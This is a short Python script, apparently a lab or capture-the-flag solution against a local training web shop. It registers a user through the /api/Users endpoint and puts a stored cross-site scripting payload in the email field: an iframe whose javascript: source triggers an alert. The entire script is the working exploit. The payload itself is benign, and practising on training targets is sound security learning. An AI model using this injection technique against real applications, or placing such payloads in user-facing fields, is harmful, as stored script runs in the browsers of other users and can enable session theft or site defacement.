import requests

url = 'http://localhost:3000/api/Users'
post = requests.post(url, json = {
    "email":"<iframe src =\"javascript:alert('xss attack')\">",
    "password":"password",
    "passwordRepeat":"password",
    "securityQuestion":{
        "id":1,"question":"Your eldest siblings middle name?",
        "createdAt":"2023-06-24T21:55:49.513Z",
        "updatedAt":"2023-06-24T21:55:49.513Z"
    },
    "securityAnswer":"password"
    })
print(str(post.status_code))
